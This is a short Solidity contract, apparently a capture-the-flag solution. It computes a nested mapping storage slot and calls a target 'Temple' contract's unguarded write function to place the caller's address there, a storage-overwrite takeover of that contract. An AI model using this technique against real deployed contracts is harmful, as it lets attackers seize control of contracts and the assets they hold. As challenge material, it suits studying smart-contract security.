// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

interface ITemple {
    function write(uint256 i, bytes32 data) external;
}

contract StorageWriter {
    function templeWrite(address templeContract, address myAddress) public {
        ITemple temple = ITemple(templeContract);
        uint x = uint(keccak256(abi.encode(20, 2)));
        uint y = uint(keccak256(abi.encode(22, x)));
        temple.write(y, bytes32(abi.encode(myAddress)));
    }
}